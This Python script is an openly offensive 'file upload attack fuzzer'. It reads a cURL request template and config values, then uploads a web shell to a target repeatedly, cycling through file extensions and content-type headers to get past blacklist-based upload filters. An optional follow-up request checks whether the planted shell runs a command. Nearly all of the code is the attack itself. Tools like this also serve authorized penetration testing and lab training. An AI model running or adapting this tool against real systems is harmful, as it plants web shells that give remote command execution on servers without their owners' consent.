import re
import subprocess
import json
import argparse

def import_config_variables():
	with open("config.json","r") as file:
		data = json.load(file)
	return data

def get_curl_subprocess(curl_filename):
	curl_post = []
	binary_payload = None
	with open(curl_filename,'r') as curl_file:
		for curl_line in curl_file:
			argument_switch_list = re.findall(r'^[ ]*(curl|-[a-zA-Z]|--data-binary)',curl_line)
			if argument_switch_list != []:
				curl_post.append(argument_switch_list[0])
			argument = re.findall(r"('.*'|POST)[ ]*\\$",curl_line)
			if argument != []:
				curl_post.append(argument[0].strip("'"))
			binary_search= re.findall(r"'------.*\\r\\n'$",curl_line)
			if binary_search != []:
				binary_payload = ((binary_search[0].strip("'")).replace('\\n','\n')).replace('\\r','\r')
	curl_post.append("@-")
	return curl_post,binary_payload

def process_text(payload_text_template, json_data, header=None, extension=None, mime_header=None):
	# use regex to replace placeholders in the cURL with configured variables
	for key, value in json_data.items():
		if isinstance(value,str) and value != None:
			payload_text_template = re.sub(rf'{key}',value,payload_text_template)
		else: 
			payload_text_template = re.sub(rf'{key}','',payload_text_template)
	if header != None:
		payload_text_template = re.sub(r'HEADER',header,payload_text_template)
	else: 
		payload_text_template = re.sub(r'HEADER','',payload_text_template)
	if extension != None:
		payload_text_template = re.sub(r'EXTENSION',extension,payload_text_template)
	else: 
		payload_text_template = re.sub(r'EXTENSION','',payload_text_template)
	if mime_header != None:
		payload_text_template = re.sub(r'MIME',mime_header,payload_text_template)
	else: 
		payload_text_template = re.sub(r'MIME','',payload_text_template)
	return payload_text_template
			
def process_curl(curl_subprocess_input_list, json_data, header=None, extension=None, mime_header=None):
	curl_subprocess_output_list = []
	for item in curl_subprocess_input_list:
		curl_subprocess_output_list.append(process_text(item,json_data))
	return curl_subprocess_output_list

def print_attack_summary(json_data, script_args, bypass_type):
	print(F"Shell: {script_args.shell_type}")
	print(F"Bypass: {bypass_type}")
	print(F"Target IP and Port: {json_data["TARGET"]}")
	print(F"Script type: {json_data["SCRIPT_FILE_TYPE_NAME"]}")
	print(F"Script: {json_data["SCRIPT"]}")
	if script_args.confirm:
		print(F"Confirm with command: {json_data["WEBSHELL_COMMAND"]}")

def print_attack_verbose_summary(json_data, script_args, bypass_type):
	print_attack_summary(json_data, script_args, bypass_type)

def confirm_file_upload(curl_subprocess, json_data, header=None, extension=None, mime_header=None):
	processed_get_curl = process_curl(curl_subprocess,json_data,header,extension,mime_header)
	verification_response = subprocess.run(processed_get_curl, capture_output=True,text=True)
	return verification_response.stdout

def run_blacklist_bypass(json_data,curl_subprocess_list,binary_payload, arg_confirm):
	for key, value in json_data.items():
		print(key + " : " + str(value))
	print("\n subprocess\n")
	processed_curl = process_curl(curl_subprocess_list,json_data)
	for curl_process in processed_curl:
		print(curl_process)
	print("\n binary piece \n")
	print(binary_payload)	
	print(F"\n Fuzzing all {json_data["SCRIPT_FILE_TYPE_NAME"]} extensions and headers: \n")
	for filetype in json_data["FILETYPES"]:
		if filetype["TYPE_NAME"] == json_data["SCRIPT_FILE_TYPE_NAME"]:
			for extension in filetype["TYPE_EXTENSIONS"]:				
				for header in filetype["TYPE_CONTENT_HEADERS"]:
					print(F"{extension} : {header}")
					binary_file_output = process_text(binary_payload,json_data,header,extension)
					binary_file_output = binary_file_output.encode('utf-8')
					#print(binary_file_output)
					# send the web request:
					curl_response = subprocess.run(processed_curl, input=binary_file_output, capture_output=True, text=False)
					print(curl_response.stdout)
					# process confirm cURL to confirm file upload and print output:
					if arg_confirm:
						confirmed_output = confirm_file_upload(json_data['WEBSHELL_TEST'],json_data,header,extension)
						print(confirmed_output)
						
def main():
	try:
		
		# Parse json data from the config file
		config_variables = import_config_variables()
		
		# Parse Arguments
		parser = argparse.ArgumentParser(description="Simple file upload attack fuzzer. Other parameters are defined in 'config.json'.")
		parser.add_argument("shell_type", type=str, help="Type of shell file. 'web' = web shell")
		parser.add_argument("-b","--blacklist_bypass", action="store_true", help="Bypass blacklist file validation. Only uses file extensions and headers associated with script filetype")
		parser.add_argument("-w","--whitelist_bypass", action="store_true",help="Bypass whitelist file validation. Uses combinations of file extensions and headers associated with other filetypes")
		parser.add_argument("-c","--confirm",action="store_true", help="Confirm webshell functionality by sending another web request from the config file. 'web' must be set as the first argument.")
		parser.add_argument("-s","--print_summary",action="store_true",help="Print summary of file upload attack.")
		parser.add_argument("-vs","--print_verbose_summary",action="store_true",help="Print verbose summary of file upload attack.")
		args = parser.parse_args()
		
		# turn whitelist and blacklist arguments into a resulable variable
		if args.blacklist_bypass:
			bypass_type = "Blacklist Bypass"
		elif args.whitelist_bypass:
			bypass_type = "Whitelist Bypass"
		else:
			bypass_type = "None Selected"
			raise ValueError("No bypass argument selected!")
		
		# Print attack summary if opted
		if args.print_verbose_summary:
			print_attack_verbose_summary(config_variables,args,bypass_type)
		elif args.print_summary:
			print_attack_summary(config_variables,args,bypass_type)
		
		# Convert curl text file to a subprocess list
		curl_subprocess, binary_payload = get_curl_subprocess(config_variables["CURL_FILE"])
			
		# execute attack
		match bypass_type:
			case "Blacklist Bypass":
				run_blacklist_bypass(config_variables, curl_subprocess, binary_payload, args.confirm)
			case "Whitelist Bypass":
				print("whitelist bypass not existent yet")
			case _:
				print("no bypass argument selected")
		
	except SystemExit as e:
		if e.code != 0:
			print(str(e))
			raise

# ensure script is executed directly instead of being a module for another file
# The dunder, "__name__" determines execution context
if __name__ == "__main__":
	main()
